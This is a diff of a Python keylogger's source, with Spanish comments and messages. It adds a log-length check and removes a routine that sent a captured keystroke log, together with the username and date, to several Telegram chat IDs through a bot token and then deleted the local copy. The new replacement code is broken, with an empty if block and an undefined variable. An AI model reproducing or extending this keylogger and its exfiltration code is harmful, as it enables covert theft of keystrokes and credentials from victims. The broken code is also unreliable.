@@ -123,6 +123,21 @@ class Functions:
     def CurrentTime(self):
         T = datetime.datetime.now()
         return T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime("%I") + ":" + T.strftime("%M") + " " + T.strftime("%p")
+    def LenghtText(self): # Verifica el el registro tiene una cierta cantidad de texto
+        try:  # Busca el archivo
+            regk = open(Config().PATH_LOG, 'r')
+            LEN_TEXT = len(regk.read())
+            print("[LenghtText] Se encontró el Archivo "+Config().LOG_NAME+ " correctamente")
+            if LEN_TEXT > Config.TelegramBot().LEN_TEXT:
+                print("[LenghtText] La cantidad de caracteres es superior a: "+str(LEN_TEXT))
+                return True
+            else:
+                print("[LenghtText] La cantidad de caracteres es es inferior a: " + str(LEN_TEXT))
+                return False
+        except:
+            print("[LenghtText] No se encontró el Archivo " + Config().LOG_NAME)
+            return False
+
 
 class Util:
     def __init__(self): #Constructor?
@@ -201,41 +216,18 @@ class Util:
             os.remove(homedir)
 
     def TelegramBot(self):
-        try:
-            print("[TelegramBot] Proceso...")
-            pathN = Functions().RamdomLogNamePATH()
-            os.rename(Config().PATH_LOG, pathN)
-            # Abre el archivo
-            f = open(pathN, 'r')
-            T = datetime.datetime.now()
-            currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime(
-                "%I") + ":" + T.strftime("%M") + " " + T.strftime("%p")
-            def SendT(ID):
-                bot = telebot.TeleBot(Config.TelegramBot().TOKEN)  # Instancia
-                bot.send_message(ID,"User: " + str(getuser()) + "\nDate: " + currentTime + "\n\r\n\r\n\r\n" + f.read())
-                print("[TelegramBot] Se obtuvo el registro de teclas y se envió a Telegram [ID] =" + str(ID))
-            try:
-                if Config.TelegramBot().ID != 000000000:
-                    SendT(Config.TelegramBot().ID)
 
-                if Config.TelegramBot().ID_2 != 000000000:
-                    SendT(Config.TelegramBot().ID_2)
 
-                if Config.TelegramBot().ID_3 != 000000000:
-                    SendT(Config.TelegramBot().ID_3)
+        print("[TelegramBot] ")
 
-                f.close()
-                os.remove(pathN)
-                print("[TelegramBot] Se eliminó el archivo caché correctamente")
-            except:
-                print("[Telegram] Error al subir el registro")
-        except:
-            try:
-                f.close()
-                os.remove(pathN)  # Borra la carpeta por posible Errores
-            except:
-                pass
-            print("[Telegram] No se encuentra el archivo")
+
+
+        if len(regk.read()) > Config.TelegramBot().LEN_TEXT :
+
+        else:
+            print("[TelegramBot] El registro de teclas no tiene la cantidad de texto mínimo para ser enviado ")
+
+
 
     def MySQL(self):
         exito = False
